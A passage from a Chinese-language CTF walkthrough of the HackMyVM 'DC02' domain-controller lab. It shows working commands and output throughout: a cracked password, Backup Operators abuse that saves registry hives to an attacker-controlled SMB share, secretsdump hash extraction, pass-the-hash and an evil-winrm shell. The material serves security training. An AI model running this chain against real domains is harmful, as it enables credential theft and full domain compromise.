class=\"hljs-number\">20</span> 02:<span class=\"hljs-number\">30</span>:06 <span class=\"hljs-number\">2025</span> (<span class=\"hljs-number\">0</span> secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: <span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">1</span> (<span class=\"hljs-number\">100.00</span>%)\nSpeed.<span class=\"hljs-comment\">#1.........:    39362 H/s (2.83ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span>\nRecovered........: <span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">1</span> (<span class=\"hljs-number\">100.00</span>%) Digests (total), <span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">1</span> (<span class=\"hljs-number\">100.00</span>%) Digests (new)\nProgress.........: <span class=\"hljs-number\">4096</span>/<span class=\"hljs-number\">14344385</span> (<span class=\"hljs-number\">0.03</span>%)\nRejected.........: <span class=\"hljs-number\">0</span>/<span class=\"hljs-number\">4096</span> (<span class=\"hljs-number\">0.00</span>%)\nRestore.Point....: <span class=\"hljs-number\">0</span>/<span class=\"hljs-number\">14344385</span> (<span class=\"hljs-number\">0.00</span>%)\nRestore.Sub.<span class=\"hljs-comment\">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>\nCandidate.Engine.: Device Generator\nCandidates.<span class=\"hljs-comment\">#1....: 123456 -> oooooo</span>\nHardware.Mon.<span class=\"hljs-comment\">#1..: Util: 15%</span>\n</code></pre>\n<p>的到密码 <code>internet</code></p>\n<h3>再次访问SMB</h3>\n<p>经测试该用户可以访问其<code>C</code>盘</p>\n<pre><code class=\"hljs language-python\">smbclient //<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>/C$ -U SOUPEDECODE.LOCAL/zximena448%internet\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> ls\n  $WinREAgent                        DH        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">51</span> <span class=\"hljs-number\">2024</span>\n  Documents <span class=\"hljs-keyword\">and</span> Settings          DHSrn        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">51</span>:08 <span class=\"hljs-number\">2024</span>\n  DumpStack.log.tmp                 AHS    <span class=\"hljs-number\">12288</span>  Mon Jan <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">33</span> <span class=\"hljs-number\">2025</span>\n  pagefile.sys                      AHS <span class=\"hljs-number\">1476395008</span>  Mon Jan <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">33</span> <span class=\"hljs-number\">2025</span>\n  PerfLogs                            D        <span class=\"hljs-number\">0</span>  Sat May  <span class=\"hljs-number\">8</span> 04:<span class=\"hljs-number\">15</span>:05 <span class=\"hljs-number\">2021</span>\n  Program Files                      DR        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">31</span> <span class=\"hljs-number\">2024</span>\n  Program Files (x86)                 D        <span class=\"hljs-number\">0</span>  Sat May  <span class=\"hljs-number\">8</span> 05:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">13</span> <span class=\"hljs-number\">2021</span>\n  ProgramData                       DHn        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">51</span>:08 <span class=\"hljs-number\">2024</span>\n  Recovery                         DHSn        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">51</span>:08 <span class=\"hljs-number\">2024</span>\n  System Volume Information         DHS        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:02:<span class=\"hljs-number\">21</span> <span class=\"hljs-number\">2024</span>\n  Users                              DR        <span class=\"hljs-number\">0</span>  Mon Jun <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">31</span>:08 <span class=\"hljs-number\">2024</span>\n  Windows                             D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">2024</span>\n\n                <span class=\"hljs-number\">12942591</span> blocks of size <span class=\"hljs-number\">4096.</span> <span class=\"hljs-number\">10926158</span> blocks available\nsmb: \\> \n</code></pre>\n<h3>UserFlag</h3>\n<pre><code class=\"hljs language-python\">smb: \\Users\\zximena448\\Desktop\\> get user.txt\ngetting file \\Users\\zximena448\\Desktop\\user.txt of size <span class=\"hljs-number\">33</span> <span class=\"hljs-keyword\">as</span> user.txt (<span class=\"hljs-number\">0.8</span> KiloBytes/sec) (average <span class=\"hljs-number\">0.8</span> KiloBytes/sec)\n\ncat user.txt                             \n2fe79eb0e02ecd4dd2833cfcbbdb504c\n</code></pre>\n<p>通过evil-winrm登陆不进去，可能无权限</p>\n<h3>域内信息收集</h3>\n<p>通过<code>LdapDomainDump</code></p>\n<pre><code class=\"hljs language-python\">ldapdomaindump SOUPEDECODE.LOCAL -u <span class=\"hljs-string\">'SOUPEDECODE.LOCAL\\zximena448'</span> -p <span class=\"hljs-string\">'internet'</span>\n[*] Connecting to host...\n[*] Binding to host\n[+] Bind OK\n[*] Starting domain dump\n[+] Domain dump finished\n</code></pre>\n<p>查看该用户信息，发现是<code>Backup Operators</code> 组的用户</p>\n<pre><code class=\"hljs language-python\">cat domain_users.grep | grep zximena448\nZach Ximena     Zach Ximena     zximena448      Backup Operators        Domain Users    06/<span class=\"hljs-number\">15</span>/<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">20</span>:04:<span class=\"hljs-number\">37</span>       01/<span class=\"hljs-number\">20</span>/<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">38</span>       01/<span class=\"hljs-number\">20</span>/<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">12</span>   NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH     06/<span class=\"hljs-number\">17</span>/<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">18</span>:09:<span class=\"hljs-number\">53</span>       S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">2986980474</span>-<span class=\"hljs-number\">46765180</span>-<span class=\"hljs-number\">2505414164</span>-<span class=\"hljs-number\">1142</span>    Volunteer teacher <span class=\"hljs-keyword\">and</span> education advocate\n</code></pre>\n<p>网上看了关于<code>Backup Operators</code> 组，是<code>Windows</code>特权组，可以提取主机上的<code>SAM</code>，<code>SECURITY</code> ，<code>SYSTEM</code>等文件</p>\n<blockquote>\n<p>Backup Operators组的成员可以备份和恢复计算机上所有的文件，不论保护这些文件的权限是什么。Backup Operators也可以登录和关闭计算机。这个组不能被重命名，删除或者移动。默认情况下，这个内置的组没有成员，可以在域控上执行备份和恢复操作。</p>\n</blockquote>\n<p>开启SMB服务器</p>\n<pre><code class=\"hljs language-python\">smbserver.py -smb2support <span class=\"hljs-string\">\"someshare\"</span> <span class=\"hljs-string\">\"./\"</span> \n</code></pre>\n<p>使用<code>impacket</code>工具集中的<code>reg</code> 远程保存<code>SAM</code>注册表项</p>\n<pre><code class=\"hljs language-python\"> **reg.py <span class=\"hljs-string\">\"SOUPEDECODE.LOCAL\"</span>/<span class=\"hljs-string\">\"zximena448\"</span>:<span class=\"hljs-string\">\"internet\"</span>@<span class=\"hljs-string\">\"192.168.56.126\"</span> save -keyName <span class=\"hljs-string\">'HKLM\\SAM'</span>  -o <span class=\"hljs-string\">'\\\\192.168.56.4\\someshare'</span>\n reg.py <span class=\"hljs-string\">\"SOUPEDECODE.LOCAL\"</span>/<span class=\"hljs-string\">\"zximena448\"</span>:<span class=\"hljs-string\">\"internet\"</span>@<span class=\"hljs-string\">\"192.168.56.126\"</span> save -keyName <span class=\"hljs-string\">'HKLM\\SECURITY'</span>  -o <span class=\"hljs-string\">'\\\\192.168.56.4\\someshare'</span>\n reg.py <span class=\"hljs-string\">\"SOUPEDECODE.LOCAL\"</span>/<span class=\"hljs-string\">\"zximena448\"</span>:<span class=\"hljs-string\">\"internet\"</span>@<span class=\"hljs-string\">\"192.168.56.126\"</span> save -keyName <span class=\"hljs-string\">'HKLM\\SYSTEM'</span>  -o <span class=\"hljs-string\">'\\\\192.168.56.4\\someshare'</span>**\n</code></pre>\n<p>然后通过<code>secretsdump.py</code> 将 <code>SAM</code> 和 <code>SECURITY</code>转成<code>HASH</code></p>\n<pre><code class=\"hljs language-python\">secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL \nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[*] Target system bootKey: <span class=\"hljs-number\">0x0c7ad5e1334e081c4dfecd5d77cc2fc6</span>\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:<span class=\"hljs-number\">500</span>:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\nGuest:<span class=\"hljs-number\">501</span>:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:<span class=\"hljs-number\">503</span>:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[-] SAM hashes extraction <span class=\"hljs-keyword\">for</span> user WDAGUtilityAccount failed. The account doesn<span class=\"hljs-string\">'t have hash information.\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \n$MACHINE.ACC:plain_password_hex:81d6bd9d4f3393bea5ae2b72f672a394eab4830f35c0462e357af7eff5d951ace05b9d7967fcad00bacf6b599e76bbf49ac936c3219241f19c8563f9022d9e02f546dc5c26c03d9e8d1f42ad94fbeecd47efc6a572a94c7b70d437d327790385fe8b0297068c5b7e7140e4b0ab83c27dc5dc9658fe4df7bb7759efb1472b7ccaeb2a73b8341120e730749b5d5b6d6428ea23cae3f9f97e1d29777f63f700da98e68ce8cc2f98b3f5d3f0c0db0ee62c1d1616c4c603764546c658a778cf2f67c9e1c601ee63ee29bfdb5ae6790fcfd013038f1e0ebfaa303aed86e5c2dbf3c62b2aa4099ed6d37aceb9ecdf778af01f80\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:159de75b1e7662879be6482554b90e55\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4\ndpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503\n[*] NL$KM \n 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...\n 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.\n 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.\n 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...\nNL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991\n[*] Cleaning up...\n</span></code></pre>\n<p>可以拿到<code>administrator</code>的NTLM</p>\n<pre><code class=\"hljs language-python\">Administrator:<span class=\"hljs-number\">500</span>:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\n</code></pre>\n<p>尝试登录，失败</p>\n<pre><code class=\"hljs language-python\">crackmapexec smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -u administrator -H 209c6174da490caeb422f3fa5a7ae634                    \nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:<span class=\"hljs-literal\">True</span>) (SMBv1:<span class=\"hljs-literal\">False</span>)\nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [-] SOUPEDECODE.LOCAL\\administrator:209c6174da490caeb422f3fa5a7ae634 STATUS_LOGON_FAILURE\n</code></pre>\n<p>现在还存在机器账户的hash <code>$MACHINE.ACC</code></p>\n<pre><code class=\"hljs language-python\">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:159de75b1e7662879be6482554b90e55\n</code></pre>\n<p>枚举看是哪台机子的哈希，得出来是<code>DC01$</code>的</p>\n<pre><code class=\"hljs language-python\">crackmapexec smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -u username.txt -H 159de75b1e7662879be6482554b90e55\nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\DC01$:159de75b1e7662879be6482554b90e55\n</code></pre>\n<p>得到是<code>DC01$</code>的hash后，再次进行<code>secretsdump.py</code> 获取<code>Administrator</code>的hash</p>\n<pre><code class=\"hljs language-python\">secretsdump.py soupedecode.local/<span class=\"hljs-string\">'DC01$'</span>@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -hashes <span class=\"hljs-string\">':159de75b1e7662879be6482554b90e55'</span> | grep <span class=\"hljs-string\">\"Administrator\"</span>\nAdministrator:<span class=\"hljs-number\">500</span>:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::\nAdministrator:aes256-cts-hmac-sha1-<span class=\"hljs-number\">96</span>:01dc1e0f079f2dfe4a880156b7192acc658b8733cc87f1c5be32c291ad8e0318\nAdministrator:aes128-cts-hmac-sha1-<span class=\"hljs-number\">96</span>:4b4cf4064e92346339b1a3ef3ff65d6b\nAdministrator:des-cbc-md5:b0614357f8160ef4\n</code></pre>\n<h3>HASH传递</h3>\n<p>拿到<code>administrator</code>的<code>NTLMhash</code>后就可以进行传递了</p>\n<pre><code class=\"hljs language-python\">crackmapexec smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -u Administrator -H 8982babd4da89d33210779a6c5b078bd\nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [*] Windows Server <span class=\"hljs-number\">2022</span> Build <span class=\"hljs-number\">20348</span> x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:<span class=\"hljs-literal\">True</span>) (SMBv1:<span class=\"hljs-literal\">False</span>)\nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Administrator:8982babd4da89d33210779a6c5b078bd (Pwn3d!)\n</code></pre>\n<pre><code class=\"hljs language-python\">evil-winrm -i <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> -u <span class=\"hljs-string\">'administrator'</span> -H <span class=\"hljs-string\">'8982babd4da89d33210779a6c5b078bd'</span>\n                                        \nEvil-WinRM shell v3<span class=\"hljs-number\">.7</span>\n                                        \nWarning: Remote path completions <span class=\"hljs-keyword\">is</span> disabled due to ruby limitation: quoting_detection_proc() function <span class=\"hljs-keyword\">is</span> unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class=\"hljs-comment\">#Remote-path-completion</span>\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>                                   \n</code></pre>\n<h3>RootFlag</h3>\n<pre><code class=\"hljs language-python\">*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\nd41d8cd98f00b204e9800998ecf8427e\n</code></pre>","title":"HackMyVM - DC02","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"DC02.\n\n https://hackmyvm.eu/machines/machine.php?vm=DC02\n \n\nNotes: Second DC from me. Enjoy it.\n\n信息打点\n\n\n\n渗透\n\nSMB\n\n无任何凭据和线索，只能从SMB开始\n\n当头一棒，不能使用匿名帐户，所以`LDAP`枚举用户也不能成功了\n\n\n\n域内用户枚举\n\n使用`kerbrute` 来枚举用户名，字典是..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"}]},"__N_SSG":true}